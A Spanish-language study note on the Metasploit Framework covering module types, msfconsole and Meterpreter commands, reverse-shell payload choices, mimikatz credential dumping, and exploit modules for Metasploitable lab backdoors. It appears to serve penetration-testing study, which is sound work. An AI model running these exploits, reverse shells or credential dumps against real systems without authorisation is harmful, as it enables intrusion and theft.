---
title: Metasploit
area: ciberseguridad
tipo: herramienta
tags: [ciberseguridad, red-team, explotacion]
created: 2026-01-18
updated: 2026-09-20
related: ["[[MOC-ciberseguridad]]", "[[red-team-killchain]]", "[[Nmap]]", "[[Metasploit]]", "[[MSFvenom]]", "[[Searchsploit]]"]
---

# Metasploit Framework

Metasploit es un framework de explotación que reúne exploits, payloads, auxiliares, post-explotación y herramientas de enumeración en una sola interfaz. Se usa para pruebas de penetración y validación de vulnerabilidades.

https://youtu.be/FHfV2Lda_Cg?si=W6sTsrxjDRenTv8m
https://youtu.be/Ipkf7hi3J1Q?si=kd7_-uJ1dgAiofNe
https://youtu.be/52Y5ocAwAPI?si=Rft3vdq9n9yV4Liu

---

## Componentes principales

### **1. Exploits**

Código que aprovecha una vulnerabilidad para obtener acceso.

- Ejemplo: `exploit/unix/ftp/vsftpd_234_backdoor`
    

### **2. Payloads**

Qué quieres lograr después del exploit (por ejemplo, una shell).  
Tipos principales:

- `inline` se ejecuta completo en la víctima.
    
- `stager` descarga el resto del payload después.  
    Ejemplos comunes:
    
- `cmd/unix/interact`
    
- `windows/meterpreter/reverse_tcp`
    

### **3. Módulos Auxiliares**

No explotan vulnerabilidades. Se usan para:

- Escaneo
    
- Enumeración
    
- Fuerza bruta
    
- SNMP, SMB, HTTP, etc  
    Ejemplo:
    
- `auxiliary/scanner/ssh/ssh_login`
    

### **4. Módulos Post**

Acciones luego del acceso:

- Dump de credenciales
    
- Keylogging
    
- Persistencia
    
- Recon interno  
    Ejemplo:
    
- `post/multi/recon/local_exploit_suggester`
    

---

## Arquitectura práctica (mental map)

Metasploit es como una suite con piezas conectadas:

`Exploit -> Payload -> Session -> Post-Exploitation Auxiliares -> Enumeración -> Exploit -> ...`

---

## Flujo de uso recomendado

1. **Enumeración previa**
    
    - Nmap, SMB, SNMP, HTTP, FTP, etc
        
2. **Seleccionar exploit o módulo auxiliar**
    
3. **Configurar variables**
    
    - `RHOSTS`, `RPORT`, `LHOST`, `PAYLOAD`, etc
        
4. **Opcional: tunnear payloads**
    
5. **Ejecutar exploit**
    
6. **Trabajar sesión**
    
7. **Post-explotar**
    

---

## Comandos esenciales en la consola `msfconsole`

### **Navegación**

`search <keyword> use <module> info show options show payloads back`

### **Configuración**

`set RHOSTS <ip> set RPORT <puerto> set LHOST <ip attck> set PAYLOAD <payload> unset <variable>`

### **Ejecución**

`exploit run check (si soporta)`

### **Sesiones**

`sessions sessions -i <id> sessions -K (matar todas)`

---

## Uso rápido de auxiliares

Ejemplos útiles:

`use auxiliary/scanner/ftp/ftp_login use auxiliary/scanner/ssh/ssh_login use auxiliary/scanner/smb/smb_version use auxiliary/scanner/http/http_version`

---

## Post explotación básica (Meterpreter)

Dentro de meterpreter:

`sysinfo getuid ipconfig ps shell upload download migrate <pid>`

Extensiones:

`load kiwi (mimikatz) load stdapi`

---

## Elección de payloads (recomendación táctica)

Según objetivo:

|Objetivo|Payload sugerido|
|---|---|
|Shell reversa|`meterpreter/reverse_tcp`|
|Entorno sin staging|`meterpreter_reverse_tcp` (inline)|
|Escenario NAT|`reverse_http` o `reverse_https`|
|Persistencia|módulos post y scripts|

---

## Explotación frecuente en labs clásicos

Ejemplos que probablemente verás en Metasploitable:

1. **FTP vsftpd 2.3.4 backdoor**
    

`use exploit/unix/ftp/vsftpd_234_backdoor`

2. **UnrealIRCd 3.2.8.1 backdoor**
    

`use exploit/unix/irc/unreal_ircd_3281_backdoor`

3. **Distcc**
    

`use exploit/unix/misc/distcc_exec`

---

## Ver también

- [[MOC-ciberseguridad]]
- [[red-team-killchain]]
- [[Nmap]]
- [[Metasploit]]
- [[MSFvenom]]
- [[Searchsploit]]
